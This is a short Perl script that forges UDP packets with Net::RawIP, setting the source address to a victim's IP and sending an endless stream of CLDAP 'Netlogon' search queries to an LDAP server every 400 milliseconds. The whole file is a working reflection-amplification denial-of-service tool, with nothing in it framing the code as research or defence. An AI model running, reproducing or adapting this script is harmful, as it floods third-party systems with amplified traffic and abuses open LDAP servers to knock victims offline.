#!/usr/bin/perl

  
use Net::RawIP;

my $cldap       = $ARGV[0];
my $target      = $ARGV[1];
my $port        = $ARGV[2] || '389';

die "[ Error: Port must be between 1 and 65535!\n"       if ($port < 1 || $port > 65535);

my $query  = "\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a";
$query    .= "\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01";
$query    .= "\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65";
$query    .= "\x63\x74\x63\x6c\x61\x73\x73\x30\x00\x00";
$query    .= "\x00\x30\x84\x00\x00\x00\x0a\x04\x08\x4e";
$query    .= "\x65\x74\x6c\x6f\x67\x6f\x6e";
 
my $sock =  new Net::RawIP({ udp => {} }) or die;
while () {
                select(undef, undef, undef, 0.40);         # Sleep 400 milliseconds
                $sock->set({  ip =>  { saddr  => $target, daddr => $cldap},
                             udp =>  { source => 31337,   dest  => $port, data => $query} });
                $sock->send;
}
